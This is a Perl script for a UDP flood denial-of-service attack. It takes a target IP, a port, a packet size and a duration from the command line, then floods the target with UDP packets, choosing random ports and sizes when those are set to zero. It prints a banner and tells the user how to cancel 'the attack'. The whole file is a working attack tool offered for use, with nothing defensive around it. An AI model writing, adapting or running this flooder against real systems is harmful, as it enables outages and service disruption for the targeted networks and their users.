#!/usr/bin/perl


#Args
# 1 - IP
# 2 - Port
# 3 - Size of the packet to send
# 4 - Time in secondes

use warnings; 
use strict;
use Term::ANSIColor;
use Socket;
use strict;

 
if ($#ARGV != 3) {
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print colored( sprintf("%4.4s", 'Dev : Low Mod\n Verison : 1.0'), 'magenta' ), "\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}